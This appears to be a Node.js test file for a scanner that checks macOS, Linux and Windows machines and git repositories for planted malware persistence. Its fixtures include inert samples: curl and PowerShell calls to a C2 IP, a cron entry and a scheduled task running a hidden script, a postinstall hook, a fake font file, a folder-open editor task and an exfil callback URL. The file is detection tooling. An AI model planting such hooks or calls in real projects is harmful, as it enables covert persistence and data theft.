import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, realpathSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';
import { packs as load } from './helpers.mjs';
import { persistence, checkouts, findRepos, defaultCtx } from '../src/local.mjs';

const packs = load();
const put = (f, t) => { mkdirSync(dirname(f), { recursive: true }); writeFileSync(f, t); };
const tmp = () => realpathSync(mkdtempSync(join(tmpdir(), 'hubsweep-local-')));
const canned = map => async (cmd, args) => map[[cmd, ...args].join(' ')] ?? { code: 1, stdout: '', stderr: `${cmd}: not found` };

test('macOS: a #ghc2 cron line and a launch agent calling the C2 host are HIGH', async () => {
  const home = tmp();
  put(join(home, 'Library/LaunchAgents/com.x.plist'), '<string>curl http://193.32.204.199:8080</string>');
  const ctx = defaultCtx({ platform: 'darwin', home, exec: canned({ 'crontab -l': { code: 0, stdout: '*/5 * * * * node ~/.x.js #ghc2\n', stderr: '' } }) });
  const r = await persistence(ctx, packs);
  assert.deepEqual(r.findings.map(f => f.kind).sort(), ['cron', 'launchAgents']);
  assert.ok(r.findings.every(f => f.severity === 'HIGH'));
  assert.ok(r.coverage.includes('crontab'));
});

test('Linux: no crontab is clean; an unreadable crontab and missing folders are gaps', async () => {
  const home = tmp();
  const empty = await persistence(defaultCtx({ platform: 'linux', home, exec: canned({ 'crontab -l': { code: 1, stdout: '', stderr: 'no crontab for me' } }) }), packs);
  assert.ok(empty.coverage.includes('crontab (empty)'));
  const denied = await persistence(defaultCtx({ platform: 'linux', home, exec: canned({ 'crontab -l': { code: 1, stdout: '', stderr: 'permission denied' } }) }), packs);
  assert.match(denied.gaps.join('\n'), /crontab: permission denied/);
  assert.ok(denied.coverage.includes('user services and autostart'), 'missing folders hold nothing planted');
});

test('Windows: scheduled tasks and the Startup folder', async () => {
  const home = tmp();
  put(join(home, 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.cmd'), 'powershell iwr http://193.32.204.199:8080');
  const ctx = defaultCtx({ platform: 'win32', home, env: {}, exec: canned({ 'schtasks /query /fo LIST /v': { code: 0, stdout: 'TaskName: \\Updater\nTask To Run: node C:\\x.js #ghc2\n', stderr: '' } }) });
  const r = await persistence(ctx, packs);
  assert.equal(r.findings.filter(f => f.kind === 'scheduledTasks').length, 2);
  assert.deepEqual(r.coverage, ['scheduled tasks', 'Startup folder']);
});

const git = (cwd, ...args) => { const r = spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8' }); assert.equal(r.status, 0, r.stderr); return r.stdout; };
const hasGit = spawnSync('git', ['--version']).status === 0;

test('checkouts: each planted file is found; a real font and node_modules are not', { skip: !hasGit && 'git not installed' }, async () => {
  const root = tmp();
  const repo = join(root, 'work', 'app');
  mkdirSync(repo, { recursive: true });
  git(repo, 'init', '-q');
  put(join(repo, '.ci-a1b2c3.sh'), '#!/bin/sh\n');
  put(join(repo, 'package.json'), JSON.stringify({ scripts: { postinstall: 'sh .ci-a1b2c3.sh' } }));
  put(join(repo, 'public/fonts/fa-solid-400.woff2'), '(function(){ /* not a font */ })()');
  put(join(repo, 'web/public/fonts/fa-solid-400.woff2'), Buffer.concat([Buffer.from('wOF2'), Buffer.alloc(20)]));
  put(join(repo, '.vscode/tasks.json'), '{ "tasks": [{ "runOptions": { "runOn": "folderOpen" } }] }');
  put(join(repo, '.github/workflows/ci.yml'), 'env:\n  WF_CALLBACK: "http://194.150.166.244:8080/exfil"\n');
  put(join(repo, 'node_modules/x/.ci-zzzzzz.sh'), 'x');
  git(repo, 'add', '-A', '-f');
  git(repo, 'commit', '-q', '-m', 'ci: refresh build cache');
  const r = await checkouts(defaultCtx(), packs, [root], new Date('2020-01-01'));
  assert.equal(r.scanned, 1);
  const ev = r.findings.map(f => `${f.severity} ${f.kind} ${f.evidence}`).join('\n');
  for (const want of [/HIGH repoFiles tracked file \.ci-a1b2c3\.sh/, /HIGH npmScripts package\.json postinstall/, /HIGH repoFiles tracked file public\/fonts\/fa-solid-400\.woff2/, /CHECK editor task \.vscode\/tasks\.json/, /HIGH repoStrings \.github\/workflows\/ci\.yml contains/, /HIGH repoCommits commit .* "ci: refresh build cache"/]) assert.match(ev, want);
  assert.ok(!/web\/public\/fonts/.test(ev), 'a real WOFF2 is left alone');
  assert.ok(!/node_modules/.test(ev));
  assert.deepEqual(r.gaps, []);
});

test('findRepos skips node_modules and stops at the depth limit', () => {
  const root = tmp();
  mkdirSync(join(root, 'a/.git'), { recursive: true });
  mkdirSync(join(root, 'node_modules/b/.git'), { recursive: true });
  mkdirSync(join(root, '1/2/3/4/5/6/7/.git'), { recursive: true });
  assert.deepEqual(findRepos([root]).map(p => p.slice(root.length + 1)), ['a']);
});
